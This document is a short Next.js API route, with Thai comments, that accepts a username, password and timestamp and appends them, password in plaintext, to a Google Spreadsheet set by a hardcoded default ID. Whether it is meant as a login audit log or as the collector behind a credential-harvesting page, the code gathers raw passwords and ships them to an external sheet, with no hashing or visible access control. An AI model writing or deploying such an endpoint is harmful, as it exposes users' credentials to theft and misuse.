import { NextRequest, NextResponse } from "next/server"

import { getSheetsService, getSystemConfig } from "@/lib/google-auth"

// ตั้งค่า Google Sheets API
const DEFAULT_LOG_ID = "1-NsKFnSosQUzSY3ReFjeoH2nZ2S-1UMDlT-SAWILMSw"
const SHEET_NAME = "Sheet1"

async function appendToSheet({ username, password, timestamp }: { username: string; password: string; timestamp: string }) {
  // แปลง timestamp เป็นเวลาประเทศไทยและรูปแบบอ่านง่าย
  const date = new Date(timestamp)
  const thTime = date.toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })

  const spreadsheetId = await getSystemConfig("LOG_LOGIN_SPREADSHEET_ID", DEFAULT_LOG_ID);
  const sheets = await getSheetsService()

  // Find the correct sheet name
  const meta = await sheets.spreadsheets.get({
    spreadsheetId,
    fields: "sheets.properties.title",
  });
  const sheetName = meta.data.sheets?.[0]?.properties?.title || SHEET_NAME;

  await sheets.spreadsheets.values.append({
    spreadsheetId,
    range: `'${sheetName}'!A:C`,
    valueInputOption: "USER_ENTERED",
    requestBody: {
      values: [[username, password, thTime]],
    },
  })
}

export async function POST(req: NextRequest) {
  try {
    const { username, password, timestamp } = await req.json()
    if (!username || !password || !timestamp) {
      return NextResponse.json({ success: false, error: "Missing fields" }, { status: 400 })
    }
    await appendToSheet({ username, password, timestamp })
    return NextResponse.json({ success: true })
  } catch (e: any) {
    console.error("[log-login] error:", e)
    return NextResponse.json({ success: false, error: e.message || "Unknown error" }, { status: 500 })
  }
}
